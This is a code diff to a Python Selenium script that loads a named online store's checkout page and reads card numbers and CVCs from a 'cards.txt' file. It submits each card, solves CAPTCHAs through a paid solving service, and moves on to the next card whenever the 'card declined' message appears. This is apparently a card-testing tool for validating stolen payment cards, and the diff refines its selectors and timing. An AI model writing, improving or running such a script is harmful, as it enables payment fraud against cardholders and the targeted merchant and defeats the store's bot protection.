@@ -37,7 +37,7 @@ driver.get(
     "https://perfumerysamples.com/checkouts/cn/Z2NwLWV1cm9wZS13ZXN0MTowMUhTUk5QSzZNM1ZKQ1QyVzdHVDlEWDNCTQ"
 )
 
-file = open("./cards.txt", "r")
+file = open("cards.txt", "r")
 
 solver = TwoCaptcha(os.environ.get("TWOCAPTCHA_API_KEY"))
 
@@ -81,14 +81,6 @@ for line in file.readlines():
             Keys.TAB
         )
         WebDriverWait(driver, 20).until(
-            EC.presence_of_element_located(
-                (
-                    By.XPATH,
-                    "//*[starts-with(@id, 'card-fields-number-')]",
-                )
-            )
-        )
-        WebDriverWait(driver, 20).until(
             EC.frame_to_be_available_and_switch_to_it(
                 (
                     By.XPATH,
@@ -129,11 +121,21 @@ for line in file.readlines():
         ).send_keys(cvc)
         driver.switch_to.default_content()
 
-        time.sleep(3)
-
         driver.find_element(
             By.XPATH,
-            "//button[contains(@type, 'submit') and contains(@class, 'QT4by _1fragemk7 rqC98 EbLsk _7QHNJ VDIfJ j6D1f janiy')]",
+            "//*[@id='pay-button-container']/div/div/button",
         ).click()
+        time.sleep(10)
+        driver.find_element(
+            By.XPATH,
+            "//*[@id='pay-button-container']/div/div/button",
+        ).click()
+
+        time.sleep(15)
+        err = driver.find_element(By.XPATH, "//div[@class='sdr03sa']")
+        decline_text = "Your card was declined. Try again or use a different payment method."
+
+        if decline_text in err.text:
+            continue
 
         start = False
